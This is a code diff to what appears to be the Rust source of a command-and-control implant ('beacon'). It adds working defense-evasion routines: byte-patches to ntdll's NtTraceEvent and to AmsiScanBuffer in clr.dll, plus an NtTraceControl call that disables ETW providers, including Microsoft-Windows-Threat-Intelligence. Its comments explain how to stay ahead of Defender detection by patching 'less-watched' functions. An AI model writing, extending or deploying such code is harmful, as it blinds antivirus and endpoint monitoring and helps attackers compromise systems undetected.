@@ -51,6 +51,14 @@ pub const AMSI_PATCH: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
 /// `xor rax, rax ; ret` — EtwEventWrite returns STATUS_SUCCESS (0), no event
 /// written. 4 bytes.
 pub const ETW_PATCH: [u8; 4] = [0x48, 0x33, 0xC0, 0xC3];
+/// `xor eax, eax ; ret` — NtTraceEvent returns STATUS_SUCCESS (0). 3 bytes.
+/// Patching `ntdll!NtTraceEvent` byte0-onward to this makes EVERY
+/// `EtwEventWrite*` that routes through it (all of them do) return immediately
+/// with success and emit no event — one patch covers the whole EtwEventWrite
+/// family (P2.1b). `xor eax,eax` (not `xor rax,rax`) is enough: STATUS_SUCCESS=0
+/// fits in 32 bits and zero-extends to rax, saving a byte. `ret` (not
+/// `ret imm16`) — caller-owned stack cleanup per the x64 ABI.
+pub const NTTRACE_PATCH: [u8; 3] = [0x31, 0xC0, 0xC3];
 
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
@@ -121,6 +129,38 @@ pub unsafe fn patch_etw() -> Result<(), &'static str> {
     write_patch(addr, &ETW_PATCH)
 }
 
+/// Patch `ntdll.dll!NtTraceEvent` → `xor eax,eax; ret` (P2.1b). One patch
+/// covers the ENTIRE `EtwEventWrite*` family: every `EtwEventWrite*` variant
+/// routes its event emission through `NtTraceEvent`, so blinding it makes all
+/// of them return immediately with STATUS_SUCCESS and emit no event — strictly
+/// broader than [`patch_etw`] (which only hits `EtwEventWrite` itself). ntdll
+/// is always loaded, so this succeeds post-bootstrap.
+///
+/// This is the P2.1b upgrade over the P0 `EtwEventWrite` byte-patch: the P0
+/// patch is "burning out" in 2026 Defender (flagged), while `NtTraceEvent` is
+/// less-watched and covers more.
+///
+/// # Safety
+/// Must run after the PEB-walk resolver is initialized. Single-threaded beacon
+/// context.
+pub unsafe fn patch_nt_trace_event() -> Result<(), &'static str> {
+    let addr = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent")
+        .ok_or("NtTraceEvent unresolved")?;
+    write_patch(addr, &NTTRACE_PATCH)
+}
+
+/// Patch an arbitrary already-resolved export address with the ETW_PATCH bytes
+/// (xor rax,rax;ret → STATUS_SUCCESS). Used by the `BlindKit::Clr` path to
+/// blind `clr.dll!AmsiScanBuffer` (same content-scan surface as amsi.dll, but
+/// on the CLR which is less-watched). `addr` must point at a code page entry.
+///
+/// # Safety
+/// `addr` must be the entry of a patchable function (code page), in a
+/// currently-mapped module. Single-threaded beacon context.
+pub unsafe fn patch_at(addr: usize) -> Result<(), &'static str> {
+    write_patch(addr, &ETW_PATCH)
+}
+
 /// Patch `amsi.dll!AmsiScanBuffer` → `mov eax,E_INVALIDARG; ret`.
 ///
 /// Returns `Err("amsi not loaded")` when `amsi.dll` is not yet in the PEB
@@ -162,4 +202,75 @@ pub unsafe fn blind() -> (bool, bool) {
     let etw = patch_etw().is_ok();
     let amsi = patch_amsi().is_ok();
     (amsi, etw)
+}
+
+/// Disable a kernel ETW provider by its GUID, userland. This is the
+/// belt-and-suspenders companion to the byte-patches: in addition to patching
+/// `NtTraceEvent` (the emission path), we flip the provider's registration
+/// `EnableInfo.IsEnabled` to 0 via `NtTraceControl` (the registration path).
+/// If the byte-patch is somehow reverted, the disabled provider still won't
+/// fire. Best-effort: returns Ok on success, Err otherwise (caller ignores).
+///
+/// **Scope honesty (verified on Server 2019):** `NtTraceControl` with
+/// `EtwpNotificationRegistrar` is the USER-MODE provider registration path. For
+/// a KERNEL provider like `Microsoft-Windows-Threat-Intelligence` this returns a
+/// negative NTSTATUS (observed `STATUS_ACCESS_DENIED`-class) — the kernel ETW
+/// provider's `IsEnabled` is owned by the kernel and is only writable from
+/// kernel mode (the BYOVD `EtwTiBlind` path). This call still has value for
+/// USER-MODE providers; for ETW-TI it is a no-op that surfaces its limitation.
+/// See [`disable_etw_provider_status`] to probe the exact NTSTATUS.
+///
+/// # Safety
+/// Resolves `ntdll!NtTraceControl` via PEB walk; calls it with a stack buffer.
+/// Single-threaded beacon context.
+pub unsafe fn disable_etw_provider(guid: &[u8; 16]) -> Result<(), &'static str> {
+    let st = unsafe { disable_etw_provider_status(guid, 0x0027) };
+    if st >= 0 {
+        Ok(())
+    } else {
+        Err("NtTraceControl disable failed")
+    }
+}
+
+/// Low-level: call `NtTraceControl` with the given control code + EnableInfo
+/// (IsEnabled=0) and return the RAW NTSTATUS. Used to probe which control codes
+/// the kernel accepts for a given provider (task C: digging into why the
+/// ETW-TI disable fails). `control_code` is the Etwp* code (e.g. 0x0027 =
+/// EtwpNotificationRegistrar, 0x0028 = EtwpNotificationRemove).
+///
+/// # Safety
+/// Resolves + calls ntdll!NtTraceControl with a stack buffer. Beacon context.
+pub unsafe fn disable_etw_provider_status(guid: &[u8; 16], control_code: u32) -> i32 {
+    type NtTraceControl = unsafe extern "system" fn(
+        u32,
+        *const core::ffi::c_void,
+        u32,
+        *mut core::ffi::c_void,
+        u32,
+        *mut u32,
+    ) -> i32;
+    let addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtTraceControl") {
+        Some(a) => a,
+        None => return -0x7FFF_FFFF, // sentinel: unresolved
+    };
+    let ntc: NtTraceControl = core::mem::transmute(addr);
+    // EnableInfo: provider GUID + reserved + IsEnabled=0.
+    #[repr(C)]
+    struct EnableInfo {
+        guid: [u8; 16],
+        _reserved: [u8; 8],
+        is_enabled: u32,
+    }
+    let ei = EnableInfo { guid: *guid, _reserved: [0; 8], is_enabled: 0 };
+    let mut ret_len: u32 = 0;
+    unsafe {
+        ntc(
+            control_code,
+            &ei as *const EnableInfo as *const core::ffi::c_void,
+            core::mem::size_of::<EnableInfo>() as u32,
+            core::ptr::null_mut(),
+            0,
+            &mut ret_len,
+        )
+    }
 }
